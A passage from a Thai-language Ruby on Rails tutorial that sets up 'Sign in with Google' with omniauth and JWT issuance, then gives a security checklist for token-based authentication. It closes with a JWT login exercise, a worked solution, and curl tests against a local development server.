   แรก: ให้แอปที่สามเข้าถึงข้อมูลได้โดยไม่ต้อง "แชร์รหัสผ่าน" ให้ใครเลย
3. **JWT ของเรากับ access token ของ Google เป็นคนละตัวกันโดยสิ้นเชิง** — token ของ Google มี
   ไว้ใช้เรียก Google API เท่านั้น (ขั้นตอนที่ 8) ส่วน JWT ที่เราออกเอง (ขั้นตอนที่ 9) มีไว้ให้
   client ของเราใช้เรียก API ของเราเอง — ทั้งสองไม่เกี่ยวข้องกันหลังจากขั้นตอนที่ 9 เสร็จแล้ว

---

## Step 449: "Sign in with Google" ด้วย `omniauth` + `omniauth-google-oauth2` และ `OmniauthCallbacksController`

**Omniauth** คือ gem มาตรฐานของวงการ Ruby ที่ห่อหุ้ม sequence ทั้งหมดใน Step 448 ไว้ให้เรา
โดยไม่ต้องเขียน HTTP request ไปมาระหว่าง Rails กับ Google เองเลยสักบรรทัดเดียว — มันทำงานเป็น
**Rack middleware** ที่ดักจับ request ไปยัง `/auth/:provider` และ `/auth/:provider/callback`
โดยอัตโนมัติ

### ติดตั้ง Gem

```ruby
# Gemfile
gem "omniauth", "~> 2.1"
gem "omniauth-google-oauth2", "~> 1.1"
gem "omniauth-rails_csrf_protection", "~> 1.0"
```

```bash
bundle install
```

> **`omniauth-rails_csrf_protection` คือ gem จำเป็น ไม่ใช่ทางเลือก:** Omniauth เวอร์ชัน 2.x
> เปลี่ยนมาตรวจสอบ CSRF token สำหรับ request ที่ไปยัง `/auth/:provider` (จุดเริ่มต้น flow)
> โดยบังคับให้เป็น **`POST` request ที่มี CSRF token ที่ถูกต้องเท่านั้น** (ไม่ใช่ `GET` ธรรมดา
> เหมือน Omniauth เวอร์ชันเก่า) เพื่อป้องกัน **"login CSRF"** — การโจมตีที่หลอกให้ browser ของ
> เหยื่อยิง request ไปเริ่ม OAuth flow โดยที่เหยื่อไม่ได้ตั้งใจ (อาจถูกใช้หลอกให้ login เข้า
> บัญชีของผู้โจมตีโดยไม่รู้ตัว) gem นี้เพิ่ม CSRF token ที่ถูกต้องให้อัตโนมัติเมื่อใช้ view
> helper ที่มันเตรียมไว้ให้

### `config/initializers/omniauth.rb`

```ruby
Rails.application.config.middleware.use OmniAuth::Builder do
  provider :google_oauth2,
           ENV["GOOGLE_CLIENT_ID"],
           ENV["GOOGLE_CLIENT_SECRET"],
           scope: "email,profile"
end

OmniAuth.config.allowed_request_methods = [:post]
OmniAuth.config.silence_get_warning = true
```

**อธิบาย:**

- `ENV["GOOGLE_CLIENT_ID"]`/`ENV["GOOGLE_CLIENT_SECRET"]` ได้มาจากการสร้าง **OAuth Client**
  ใน [Google Cloud Console](https://console.cloud.google.com/) (เมนู "APIs & Services" →
  "Credentials") — ไม่ควร hardcode ค่าจริงลงในโค้ดเด็ดขาด ใน production ควรเก็บผ่าน
  `bin/rails credentials:edit` แทนการใช้ `ENV` ตรงๆ ด้วยซ้ำ (จะเรียนเรื่อง credentials
  management เต็มรูปแบบใน **Part 074** และ **Part 081**)
- `scope: "email,profile"` ระบุว่าเราขอสิทธิ์เข้าถึงแค่ **อีเมลกับข้อมูลโปรไฟล์พื้นฐาน**
  เท่านั้น — หลักการ **least privilege** (ขอสิทธิ์เท่าที่จำเป็นจริงๆ) ใช้ได้กับ OAuth scope
  เช่นเดียวกับที่ใช้กับ RBAC ใน Part 044
- `allowed_request_methods = [:post]` ล็อกให้ endpoint เริ่ม flow (`/auth/:provider`) รับได้
  แค่ `POST` เท่านั้น ตามที่ `omniauth-rails_csrf_protection` ต้องการ

### ⚠️ สิ่งที่ต้องตั้งค่าเพิ่มถ้าใช้กับ Rails โหมด `--api`

ระหว่างทดสอบเขียน Part นี้จริง พบปัญหาสำคัญที่ต้องแจ้งไว้ล่วงหน้า: Omniauth **ต้องใช้ session**
ระหว่างขั้นตอน redirect ไป Google แล้ววกกลับมาที่ callback (เก็บค่า `state` ไว้ป้องกัน CSRF
ของ OAuth เอง — คนละชั้นกับ CSRF ของ Rails ที่เพิ่งพูดถึงข้างบน) แต่ Rails โหมด `--api` **ปิด
middleware เรื่อง session/cookies ไว้โดย default** (ตามที่ comment ใน `config/application.rb`
บอกไว้ตรงๆ) ถ้าไม่เปิดกลับมา จะได้ error `OmniAuth::NoSessionError` ทันทีที่เริ่ม flow

วิธีแก้คือเปิด middleware สองตัวกลับมาเฉพาะจุดนี้ ใน `config/application.rb`:

```ruby
module JwtDemo
  class Application < Rails::Application
    config.api_only = true

    # Omniauth ต้องใช้ session ระหว่างขั้นตอน redirect ไปยัง provider แล้ววกกลับมาที่ callback
    config.middleware.use ActionDispatch::Cookies
    config.middleware.use ActionDispatch::Session::CookieStore
  end
end
```

ทดสอบรันจริงยืนยันว่า **ถ้าไม่เพิ่ม 2 บรรทัดนี้ Omniauth middleware จะ raise
`OmniAuth::NoSessionError` ทันทีที่มี request เข้ามา** — เป็นจุดที่พลาดง่ายมากเวลาผสม Omniauth
เข้ากับ Rails API-only app เพราะ error message ไม่ได้บอกตรงๆ ว่าต้นเหตุคือ middleware ที่หายไป

### `User` Model — เพิ่ม `provider`/`uid` และ `find_or_create_from_omniauth`

```bash
bin/rails g migration AddOmniauthToUsers provider:string uid:string
bin/rails db:migrate
```

```ruby
# app/models/user.rb
class User < ApplicationRecord
  has_secure_password

  validates :email, presence: true, uniqueness: true

  def self.find_or_create_from_omniauth(auth)
    find_or_create_by!(provider: auth.provider, uid: auth.uid) do |user|
      user.email = auth.info.email
      # ผู้ใช้ที่ login ผ่าน OAuth ไม่มีรหัสผ่านของตัวเอง แต่ has_secure_password ยังต้องการ
      # ค่า password ตอนสร้าง record ครั้งแรก จึงสุ่มรหัสผ่านที่คาดเดาไม่ได้ให้แทน (ผู้ใช้
      # จะไม่มีวันต้องใช้รหัสผ่านนี้ เพราะ login ผ่าน Google เท่านั้น)
      user.password = SecureRandom.hex(32)
    end
  end
end
```

**อธิบาย:**

- **`find_or_create_by!(provider:, uid:)` ไม่ใช่ `find_or_create_by!(email:)`** — จุดนี้สำคัญ
  มาก ต้องใช้คู่ `provider` + `uid` (uid คือ ID เฉพาะของผู้ใช้ในระบบ Google เอง ไม่ใช่อีเมล)
  เป็นตัวระบุตัวตนที่ไม่ซ้ำ เพราะ **อีเมลเปลี่ยนแปลงได้** (ผู้ใช้เปลี่ยนอีเมลหลักของ Google
  account) แต่ `uid` ของแต่ละบัญชีคงที่ตลอดไป การผูกกับ `email` ตรงๆ ยังเปิดความเสี่ยงเรื่อง
  **account takeover**: ถ้ามีคนสมัคร Google account ใหม่ด้วยอีเมลเดียวกับที่ผู้ใช้เดิมเคยใช้
  สมัครแบบรหัสผ่านไว้ในระบบเรา (ถ้าระบบรองรับทั้งสองวิธี) การ auto-link ผ่าน email อาจทำให้
  บัญชีถูกเข้าควบคุมผิดคน
- `auth` ที่รับเข้ามาคือ `OmniAuth::AuthHash` object — Omniauth normalize ข้อมูลจาก provider
  ต่างๆ (Google, Facebook, GitHub ฯลฯ) ให้อยู่ในรูปแบบเดียวกันเสมอ (`auth.provider`,
  `auth.uid`, `auth.info.email`, `auth.info.name`) ทำให้เขียนโค้ดรองรับหลาย provider ได้ง่าย
  โดยไม่ต้องรู้รายละเอียดเฉพาะของแต่ละเจ้า

### `OmniauthCallbacksController`

```ruby
# app/controllers/omniauth_callbacks_controller.rb
class OmniauthCallbacksController < ApplicationController
  def google_oauth2
    auth = request.env["omniauth.auth"]
    user = User.find_or_create_from_omniauth(auth)
    token = JsonWebToken.encode({ user_id: user.id })

    render json: { token: token, user: { id: user.id, email: user.email } }
  end

  def failure
    render json: { error: "เข้าสู่ระบบผ่าน OAuth ไม่สำเร็จ: #{params[:message]}" }, status: :unauthorized
  end
end
```

**อธิบาย:** เมื่อ Omniauth ทำ flow ทั้งหมดใน Step 448 เสร็จเรียบร้อยแล้ว (redirect ไป Google,
รับ code กลับมา, แลกเป็น token, เรียก API ขอข้อมูลผู้ใช้) มันจะเรียก action ที่ตรงกับชื่อ
provider (`google_oauth2`) พร้อมใส่ผลลัพธ์ทั้งหมดไว้ใน `request.env["omniauth.auth"]` ให้
พร้อมใช้งานทันที — **จุดนี้คือจุดเดียวที่โค้ดของเราต้องเขียนเอง** ส่วนที่เหลือทั้งหมด (การคุย
กับ Google โดยตรง) Omniauth จัดการให้หมดแล้ว จากนั้นเราแค่ **แปลงผลลัพธ์จาก Google ให้เป็น
`User` ในระบบของเรา แล้วออก JWT ของเราเองตามปกติ** — คือเหตุผลที่ขั้นตอนที่ 9 ใน sequence
diagram ของ Step 448 บอกว่า "Rails App ออก JWT ของตัวเอง" — จาก action นี้เป็นต้นไป ระบบของ
เราทำงานเหมือนเดิมทุกประการกับที่เรียนมาตั้งแต่ Step 444 ไม่ต้องแยกโค้ดจัดการ token คนละชุด
ระหว่างผู้ใช้ที่ login ด้วยรหัสผ่านกับผู้ใช้ที่ login ผ่าน Google เลย

### `config/routes.rb`

```ruby
get "auth/:provider/callback", to: "omniauth_callbacks#google_oauth2"
get "auth/failure", to: "omniauth_callbacks#failure"
```

### ทดสอบ Logic การ Find-or-Create ด้วย Mock Auth Hash (ทดสอบรันจริง)

เนื่องจากการทดสอบ OAuth flow เต็มรูปแบบต้องมี Google Client ID/Secret จริง (ไม่เหมาะกับการ
รันอัตโนมัติ) วิธีทดสอบ logic ฝั่งเราเองที่ทำได้จริงและนิยมใช้คือ **จำลอง `OmniAuth::AuthHash`
ขึ้นมาเอง** แล้วเรียก method ตรงๆ:

```ruby
require "omniauth"

auth_hash = OmniAuth::AuthHash.new(
  provider: "google_oauth2",
  uid: "1234567890",
  info: OmniAuth::AuthHash::InfoHash.new(email: "googleuser@example.com", name: "Google User")
)

user = User.find_or_create_from_omniauth(auth_hash)
puts "Created/found user: id=#{user.id}, email=#{user.email}, provider=#{user.provider}, uid=#{user.uid}"

# เรียกซ้ำ ควรได้ user ตัวเดิม ไม่สร้างซ้ำ
user2 = User.find_or_create_from_omniauth(auth_hash)
puts "Second call same record? #{user.id == user2.id}"

token = JsonWebToken.encode({ user_id: user.id })
decoded = JsonWebToken.decode(token)
puts "Token decode user_id matches: #{decoded[:user_id] == user.id}"
```

ผลลัพธ์ที่ทดสอบรันจริง:

```
Created/found user: id=2, email=googleuser@example.com, provider=google_oauth2, uid=1234567890
Second call same record? true
Token decode user_id matches: true
```

ยืนยันว่า `find_or_create_from_omniauth` ทำงานถูกต้องทั้งตอนสร้าง user ใหม่ครั้งแรก และตอนหา
user เดิมเจอในการ login ครั้งถัดๆ ไป (ไม่สร้างซ้ำ) และ JWT ที่ออกจากผู้ใช้ที่ login ผ่าน OAuth
ก็ decode กลับมาได้ถูกต้องเหมือน user ที่ login ด้วยรหัสผ่านทุกประการ — **เป็นวิธีทดสอบ
OAuth integration ที่ใช้จริงในวงการ**: mock เฉพาะส่วนที่ Omniauth รับผิดชอบ (การคุยกับ
provider ภายนอก) แล้วทดสอบเฉพาะ logic ที่เราเขียนเอง (จะเจาะลึกเทคนิค mocking/stubbing
สำหรับ external service แบบนี้อีกครั้งใน **Part 049**)

> **preview:** เรื่อง Omniauth กับ provider อื่นๆ (Facebook, GitHub) และการผูก OAuth เข้ากับ
> ระบบ email/notification จะกลับมาอีกครั้งใน **Part 072 (เฟส 11)**

---

## Step 450: Security Checklist สำหรับ API/Token Auth + แบบฝึกหัดปิดท้าย Phase 5

ก่อนปิด Phase 5 มาสรุปเป็น **checklist ความปลอดภัย** ที่ควรตรวจสอบทุกครั้งเมื่อสร้างระบบ
token-based authentication จริงใน production:

### Checklist ความปลอดภัยสำหรับ API/Token Auth

- [ ] **บังคับ HTTPS เสมอ ไม่มีข้อยกเว้น** — token ที่ส่งผ่าน HTTP ธรรมดา (ไม่เข้ารหัส) ถูก
      ดักจับกลางทางได้ง่ายมาก (man-in-the-middle attack) HTTPS เข้ารหัสทั้ง request/response
      ทั้งหมดรวมถึง header `Authorization` ด้วย — ตั้งค่า `config.force_ssl = true` ใน
      production environment ของ Rails เสมอ
- [ ] **ห้ามใส่ token ไว้ใน URL (query string) เด็ดขาด** — เช่น
      `GET /notes?token=eyJhbG...` แม้จะผ่าน HTTPS ก็ตาม เพราะ URL มักถูกบันทึกไว้ใน
      **access log ของ server, browser history, และ referrer header** ที่ส่งต่อไปยังเว็บไซต์
      อื่นเมื่อคลิกลิงก์ออกจากหน้านั้น — ใช้ HTTP header `Authorization: Bearer <token>`
      เท่านั้น (ตามที่เรียนมาตลอด Part นี้)
- [ ] **อย่า log token เต็มๆ ลง application log** — ถ้าจำเป็นต้อง log สำหรับ debug ให้ log
      แค่บางส่วน (เช่น 8 ตัวอักษรแรก) หรือ hash ของมันแทน ป้องกันไม่ให้ log file (ที่มักมีสิทธิ์
      เข้าถึงกว้างกว่าฐานข้อมูลจริง) กลายเป็นแหล่งรั่วไหลของ token ที่ใช้งานได้จริง — Rails มี
      `config.filter_parameters` ที่ช่วยกรอง sensitive parameter ออกจาก log อัตโนมัติ ควรเพิ่ม
      `:token`, `:authorization` เข้าไปในรายการนี้ด้วย
- [ ] **`exp` (expiration) ต้องมีเสมอ ห้ามออก JWT ที่ไม่มีวันหมดอายุ** — ตามที่เน้นย้ำใน
      Step 445–447
- [ ] **Secret key สำหรับเซ็น JWT ต้องยาวและสุ่มเพียงพอ เก็บผ่าน Rails credentials ไม่ hardcode
      ในโค้ด** — secret ที่สั้นหรือเดาง่ายเปิดช่องให้ผู้โจมตี brute-force หาค่า secret แล้ว
      ปลอมแปลง token เองได้ (ต่างจาก bcrypt ที่ตั้งใจให้คำนวณช้า HMAC ของ JWT คำนวณเร็วมาก
      จึง brute-force ได้เร็วกว่าถ้า secret สั้นเกินไป)
- [ ] **CSRF ไม่จำเป็นสำหรับ token-based auth (ที่ใช้ header) แต่ยังคงสำคัญสำหรับส่วนที่ใช้
      cookie** — เหตุผลที่ CSRF ไม่ใช่ปัญหาสำหรับ token ใน `Authorization` header: การโจมตี
      CSRF อาศัย "browser ส่ง cookie ไปแนบให้อัตโนมัติ" โดยที่เหยื่อไม่รู้ตัว แต่ **ไม่มีกลไก
      ใดที่ทำให้ browser แนบ custom header อย่าง `Authorization` ไปกับ request ข้ามเว็บไซต์
      โดยอัตโนมัติได้เลย** (JavaScript ของผู้โจมตีต้องเขียนโค้ดเรียก `fetch` เองเท่านั้น ซึ่งจะ
      โดน CORS policy กันไว้ถ้าตั้งค่าถูกต้อง) **แต่** ถ้าระบบใช้ httpOnly cookie เก็บ refresh
      token ตามที่แนะนำใน Step 446 — endpoint ที่รับ cookie นั้น (`/refresh`, `/logout`) ยังคง
      ต้องพิจารณาเรื่อง CSRF อยู่ (`SameSite` attribute คือแนวป้องกันหลัก)
- [ ] **Rate limiting สำหรับ `/login` และ `/refresh`** — ป้องกัน brute-force เดารหัสผ่านหรือ
      เดา refresh token (แม้จะเดาไม่ได้ในทางปฏิบัติเพราะสุ่ม 32 byte ก็ตาม การมี rate limit
      คือ defense-in-depth อีกชั้น) — จะเรียนเครื่องมือจริงสำหรับเรื่องนี้ (`rack-attack`) ใน
      **Part 060**
- [ ] **Validate `redirect_uri` ของ OAuth ให้ตรงกับที่ลงทะเบียนไว้เท่านั้น** — Google/provider
      ทุกเจ้าบังคับเรื่องนี้อยู่แล้วเป็นมาตรฐาน (ป้องกันไม่ให้ authorization code ถูกส่งไปยัง
      domain ปลอมที่ผู้โจมตีควบคุม) แต่ควรตรวจสอบว่าตั้งค่า `redirect_uri` ใน Google Cloud
      Console ให้ตรงกับ production domain จริงเท่านั้น ไม่เผลอเปิดกว้างเกินไป

> **preview เต็มรูปแบบ:** checklist ข้างต้นเป็นเพียงส่วนหนึ่งของภาพใหญ่เรื่องความปลอดภัยของ
> Rails application — **Part 079 (OWASP Top 10 ใน context ของ Rails: SQLi, XSS, CSRF)**,
> **Part 080 (Mass assignment, secure headers, Brakeman scan)**, และ **Part 081 (Secrets
> management, ActiveRecord Encryption, security checklist ก่อน production)** ใน **Phase 13**
> จะพาเจาะลึกทุกหัวข้อเหล่านี้อย่างละเอียดพร้อมเครื่องมือสแกนอัตโนมัติ

---

## แบบฝึกหัด: สร้าง Mini API พร้อม JWT Login/Protected Endpoint ครบวงจร

### โจทย์

สร้าง Rails API-only application ชื่อ `notes_api` ที่มีคุณสมบัติดังนี้:

1. Model `User` พร้อม `has_secure_password`
2. `POST /login` — รับ `email`/`password` คืน JWT ถ้าถูกต้อง
3. `GET /notes` — protected endpoint ที่ต้องแนบ `Authorization: Bearer <token>` ที่ถูกต้อง
   จึงจะเข้าถึงได้ คืนข้อความทักทายพร้อมอีเมลของผู้ใช้ปัจจุบัน
4. Token ต้องมี `exp` อายุสั้น (ใช้ 15 นาทีเป็นค่าเริ่มต้น)
5. ทดสอบด้วย `curl` ให้ครบทุกกรณี: login สำเร็จ, login ผิด, เรียก endpoint ด้วย token ถูกต้อง,
   เรียกโดยไม่มี token, เรียกด้วย token ปลอม, และ **เรียกด้วย token ที่หมดอายุแล้วจริงๆ**
   (ไม่ใช่แค่ token ปลอม)

### เฉลย

```bash
rails new notes_api --api -d sqlite3
cd notes_api
```

```ruby
# Gemfile — เอา # ออกจากบรรทัด bcrypt ที่มีอยู่แล้ว แล้วเพิ่มบรรทัด jwt
gem "bcrypt", "~> 3.1.7"
gem "jwt", "~> 2.9"
```

```bash
bundle install
bin/rails g model User email:string:uniq password_digest:string
bin/rails db:migrate
```

```ruby
# app/models/user.rb
class User < ApplicationRecord
  has_secure_password

  validates :email, presence: true, uniqueness: true
end
```

```ruby
# app/lib/json_web_token.rb
require "jwt"

class JsonWebToken
  ALGORITHM = "HS256"

  def self.encode(payload, exp: 15.minutes.from_now)
    payload = payload.dup
    payload[:exp] = exp.to_i
    payload[:iat] = Time.now.to_i
    secret = Rails.application.credentials.jwt_secret || Rails.application.secret_key_base
    JWT.encode(payload, secret, ALGORITHM)
  end

  def self.decode(token)
    secret = Rails.application.credentials.jwt_secret || Rails.application.secret_key_base
    decoded = JWT.decode(token, secret, true, algorithm: ALGORITHM)[0]
    ActiveSupport::HashWithIndifferentAccess.new(decoded)
  end
end
```

```ruby
# app/controllers/concerns/authenticatable.rb
module Authenticatable
  extend ActiveSupport::Concern

  included do
    before_action :authenticate_request!
    attr_reader :current_user
  end

  private

  def authenticate_request!
    header = request.headers["Authorization"]
    token = header&.split(" ")&.last

    render json: { error: "ไม่พบ token กรุณา login ก่อนใช้งาน" }, status: :unauthorized and return if token.blank?

    payload = JsonWebToken.decode(token)
    @current_user = User.find(payload[:user_id])
  rescue JWT::ExpiredSignature
    render json: { error: "token หมดอายุแล้ว กรุณา login ใหม่" }, status: :unauthorized
  rescue JWT::DecodeError
    render json: { error: "token ไม่ถูกต้อง" }, status: :unauthorized
  rescue ActiveRecord::RecordNotFound
    render json: { error: "ไม่พบผู้ใช้งานนี้ในระบบ" }, status: :unauthorized
  end
end
```

```ruby
# app/controllers/application_controller.rb
class ApplicationController < ActionController::API
  rescue_from JWT::DecodeError do
    render json: { error: "token ไม่ถูกต้องหรือเสียหาย" }, status: :unauthorized
  end
end
```

```ruby
# app/controllers/sessions_controller.rb
class SessionsController < ApplicationController
  def create
    user = User.find_by(email: params[:email])

    if user&.authenticate(params[:password])
      token = JsonWebToken.encode({ user_id: user.id })
      render json: { token: token, exp: 15.minutes.from_now.to_i, user: { id: user.id, email: user.email } },
             status: :ok
    else
      render json: { error: "อีเมลหรือรหัสผ่านไม่ถูกต้อง" }, status: :unauthorized
    end
  end
end
```

```ruby
# app/controllers/notes_controller.rb
class NotesController < ApplicationController
  include Authenticatable

  def index
    render json: { message: "สวัสดีคุณ #{current_user.email}, นี่คือรายการโน้ตลับของคุณ" }
  end
end
```

```ruby
# config/routes.rb
Rails.application.routes.draw do
  get "up" => "rails/health#show", as: :rails_health_check

  post "login", to: "sessions#create"
  get "notes", to: "notes#index"
end
```

สร้าง user ทดสอบและรัน server:

```bash
bin/rails runner 'User.find_or_create_by!(email: "test@example.com") { |u| u.password = "password123" }'
bin/rails server -p 3099
```

### ทดสอบครบทุกกรณีด้วย `curl` (คำสั่งจริงที่รันแล้วได้ผลตามนี้)

```bash
BASE=http://127.0.0.1:3099

# 1) Login สำเร็จ
curl -s -X POST "$BASE/login" -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password123"}'
# => {"token":"eyJhbGci...","exp":1790404789,"user":{"id":1,"email":"test@example.com"}}

TOKEN="<คัดลอก token จาก response ข้างบนมาใส่ตรงนี้>"

# 2) Login รหัสผ่านผิด
curl -s -X POST "$BASE/login" -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"wrong"}'
# => {"error":"อีเมลหรือรหัสผ่านไม่ถูกต้อง"}

# 3) เข้าถึง protected endpoint ด้วย token ที่ถูกต้อง
curl -s "$BASE/notes" -H "Authorization: Bearer $TOKEN"
# => {"message":"สวัสดีคุณ test@example.com, นี่คือรายการโน้ตลับของคุณ"}

# 4) เข้าถึงโดยไม่มี token
curl -s -w "\nHTTP_STATUS:%{http_code}\n" "$BASE/notes"
# => {"error":"ไม่พบ token กรุณา login ก่อนใช้งาน"}
#    HTTP_STATUS:401

# 5) เข้าถึงด้วย token ปลอม
curl -s -w "\nHTTP_STATUS:%{http_code}\n" "$BASE/notes" -H "Authorization: Bearer garbage.token.here"
# => {"error":"token ไม่ถูกต้อง"}
#    HTTP_STATUS:401

# 6) สร้าง token ที่หมดอายุไปแล้วจริงๆ (exp เป็นเวลาในอดีต) แล้วทดสอบว่าถูกปฏิเสธ
EXPIRED=$(bin/rails runner 'puts JsonWebToken.encode({ user_id: User.first.id }, exp: 5.seconds.ago)')
curl -s -w "\nHTTP_STATUS:%{http_code}\n" "$BASE/notes" -H "Authorization: Bearer $EXPIRED"
# => {"error":"token หมดอายุแล้ว กรุณา login ใหม่"}
#    HTTP_STATUS:401
```

ทดสอบรันจริงยืนยันแล้วว่าทั้ง 6 กรณีให้ผลลัพธ์ตรงตามที่คาดหวังทุกประการ **โดยเฉพาะกรณีที่ 6**
ซึ่งเป็นจุดสำคัญที่สุดของแบบฝึกหัดนี้ — พิสูจน์ว่า claim `exp` ถูกตรวจสอบจริง ไม่ใช่แค่มีอยู่ใน
payload เฉยๆ โดยไม่มีผลอะไร (`JWT.decode` ของ gem `jwt` ตรวจสอบ `exp` ให้อัตโนมัติเมื่อพบ
claim นี้ใน payload แล้ว raise `JWT::ExpiredSignature` ทันทีถ้าเวลาปัจจุบันเลย `exp` ไปแล้ว)

### แบบฝึกหัดเพิ่มเติม (ทำเอง — ไม่มีเฉลย)

1. **เพิ่ม Refresh Token Endpoint แบบสมบูรณ์** — ต่อยอดจากเฉลยข้างบน เพิ่ม model
   `RefreshToken` (ดูโครงจาก Step 445), endpoint `POST /refresh` ที่แลก refresh token เป็น
   access token ใหม่, และ `DELETE /logout` ที่เพิกถอน refresh token — เขียน `curl` ทดสอบให้
   ครบว่า: login ได้ token คู่, refresh ได้ access token ใหม่ที่ **ใช้เรียก `/notes` ได้จริง**,
   และหลัง logout แล้ว refresh token เดิม **ต้องใช้ซ้ำไม่ได้อีก**
2. **เพิ่ม "Sign in with GitHub"** — สมัคร OAuth App บน GitHub Developer Settings
   (`https://github.com/settings/developers`) แล้วเพิ่ม gem `omniauth-github`, เขียน
   `OmniauthCallbacksController#github` แยกจาก `#google_oauth2` (สังเกตว่าโครงสร้างข้อมูลจาก
   GitHub ผ่าน `auth.info` มีฟิลด์ต่างจาก Google เล็กน้อย เช่นอาจไม่มี `email` เสมอไปถ้าผู้ใช้
   ตั้งค่าเป็น private — ต้องจัดการ fallback ให้เหมาะสม) แล้วทดสอบด้วย mock `OmniAuth::AuthHash`
   แบบเดียวกับ Step 449
3. **ทำ Server-side Denylist ด้วย Rails cache** — เพิ่ม claim `jti` (สุ่มด้วย `SecureRandom.uuid`
   ตอน encode) ใน `JsonWebToken`, เขียน endpoint `POST /logout` ที่ไม่ใช้ refresh token แต่
   เพิกถอน **access token ปัจจุบันทันที** โดยเก็บ `jti` ที่ถูกเพิกถอนไว้ใน
   `Rails.cache.write(jti, true, expires_in: <เวลาที่เหลือของ token>)` แล้วแก้ `Authenticatable`
   concern ให้เช็ค `Rails.cache.read(payload[:jti])` ก่อนอนุญาตทุกครั้ง (ทดลองเปรียบเทียบ
   ข้อดี/ข้อเสียของวิธีนี้กับ refresh token pattern ที่เรียนในแบบฝึกหัดข้อ 1 ด้วยตัวเอง ตาม
   หลักการที่อธิบายไว้ใน Step 447 — `Rails.cache` แบบเต็มรูปแบบจะเรียนใน **Part 063**)

---

## สรุปสิ่งที่ได้เรียนรู้ใน Part นี้

- เข้าใจว่าทำไม **session-based authentication** (Part 041–042) ไม่เหมาะกับ mobile app, SPA
  คนละโดเมน, หรือ machine-to-machine communication — ปัญหาเรื่อง cookie jar, CORS, และการ
  scale แบบ stateful
- เข้าใจโครงสร้างจริงของ **JWT**: `header.payload.signature` เข้ารหัสด้วย Base64URL และ
  หลักการที่สำคัญที่สุด — **JWT คือการเซ็นลายเซ็น ไม่ใช่การเข้ารหัส** payload อ่านได้โดยใครก็
  ตามที่มี token จึงห้ามใส่ข้อมูลลับลงไปเด็ดขาด
- ใช้ gem **`jwt`** เข้ารหัส/ถอดรหัส token จริงด้วย `JWT.encode`/`JWT.decode` พร้อมเข้าใจ
  ความแตกต่างของ `JWT::DecodeError`, `JWT::ExpiredSignature`, `JWT::VerificationError`
- สร้าง **API authentication flow ขั้นต่ำที่สมบูรณ์**: `POST /login` ออก JWT, `Authenticatable`
  concern ตรวจสอบ `Authorization: Bearer <token>`, และ `rescue_from JWT::DecodeError` ระดับ
  ApplicationController — ทดสอบ end-to-end ด้วย `curl` จริงครบทุก edge case
- ออกแบบและสร้าง **Refresh Token Pattern**: access token อายุสั้นเป็น JWT, refresh token อายุ
  ยาวเป็น opaque token เก็บ digest ไว้ในฐานข้อมูล เพื่อให้ revoke ได้ทันทีจริงตอน logout
- เข้าใจ trade-off ของการเก็บ refresh token ไว้ที่ **httpOnly cookie vs `localStorage`** และ
  ความเสี่ยงเรื่อง **XSS**
- เข้าใจปัญหาคลาสสิกเรื่อง **การ revoke JWT** ที่แก้ไม่ได้ตรงๆ และสองวิธีบรรเทาที่ใช้จริง:
  short expiry + refresh token (แนะนำ) และ server-side denylist (กรณีพิเศษ)
- เข้าใจ **OAuth 2.0** ในระดับแนวคิดที่ถูกต้อง (authorization ไม่ใช่ authentication โดยตรง)
  พร้อม sequence diagram เต็มรูปแบบของ Authorization Code Flow ก่อนใช้ Omniauth
- ใช้ **`omniauth` + `omniauth-google-oauth2`** ทำฟีเจอร์ "Sign in with Google" ได้จริง พร้อม
  `OmniauthCallbacksController` ที่ find-or-create `User` จากข้อมูล provider และออก JWT ของ
  ระบบตัวเองต่อ
- รู้จัก **security checklist** สำหรับ API/token authentication: HTTPS บังคับ, ไม่ใส่ token
  ใน URL/log, เข้าใจว่า CSRF ไม่จำเป็นสำหรับ token-based auth (แต่ยังสำคัญสำหรับ cookie-based)

## สรุปภาพรวม Phase 5: Authentication & Authorization

ยินดีด้วย! ตอนนี้ **Phase 5: Authentication & Authorization (Part 041–045, Step 401–450)**
เสร็จสมบูรณ์แล้ว เราเดินทางจากการเขียนระบบยืนยันตัวตนด้วยมือทีละบรรทัดด้วย
`has_secure_password` และ session (Part 041), เปลี่ยนมาใช้เครื่องมือระดับ production อย่าง
**Devise** ที่มาพร้อมฟีเจอร์ confirmable/lockable ครบครัน (Part 042), เพิ่มชั้น
**authorization** ด้วย **Pundit** ที่แยก policy ออกจาก model อย่างเป็นระเบียบ (Part 043),
สำรวจทางเลือกด้วย **CanCanCan** และออกแบบ **RBAC** เต็มรูปแบบ (Part 044) จนมาถึง Part นี้ที่
ก้าวข้ามขอบเขตของ "เว็บที่ render HTML ให้ browser" ไปสู่โลกของ **API, mobile client, และ
third-party integration** ด้วย **JWT และ OAuth**

ภาพรวมทั้ง 5 Part นี้แสดงให้เห็นความจริงสำคัญอย่างหนึ่งของงาน engineering ระดับมืออาชีพ:
**"authentication" และ "authorization" ไม่ใช่ฟีเจอร์เดียวที่ทำครั้งเดียวจบ** แต่เป็น**ชุด
เครื่องมือที่เลือกใช้ตามบริบท** — เว็บแอปแบบดั้งเดิมใช้ session + Devise, ระบบสิทธิ์ซับซ้อนใช้
Pundit หรือ CanCanCan ตามสไตล์ทีม, และเมื่อต้องเปิด API ให้ mobile app หรือระบบภายนอกเข้าถึง
ก็สลับมาใช้ JWT — **ระบบจริงในโลก production จำนวนมากใช้หลายวิธีผสมกันพร้อมกัน** เช่น เว็บหลัก
ใช้ Devise + session สำหรับผู้ใช้ทั่วไป ในขณะที่ endpoint `/api/v1/*` ใช้ JWT สำหรับแอปมือถือ
ของบริษัทเดียวกัน โดยทั้งสองระบบแชร์ตาราง `users` และ policy การให้สิทธิ์ (Pundit/CanCanCan)
เดียวกันได้อย่างไม่ขัดแย้งกัน เพราะ "การยืนยันตัวตน" (authentication) กับ "การตรวจสอบสิทธิ์"
(authorization) เป็นคนละชั้นที่แยกจากกันได้อย่างชัดเจน — บทเรียนสำคัญที่สุดของ Phase 5 ทั้งหมด

ทักษะที่ได้จาก 5 Part นี้ — session, cookie, bcrypt, Devise, Pundit policy, CanCanCan ability,
RBAC, JWT, refresh token, OAuth — คือ**กล่องเครื่องมือความปลอดภัยพื้นฐาน**ที่นักพัฒนา Rails
ทุกคนต้องมีติดตัว และจะถูกนำมาใช้ซ้ำแทบทุก Phase ที่เหลือของหลักสูตร ไม่ว่าจะเป็นตอนสร้าง
API เต็มรูปแบบใน **Phase 8**, ตอนทำระบบชำระเงินที่ต้องยืนยันตัวตนเข้มงวดใน **Phase 11**, หรือ
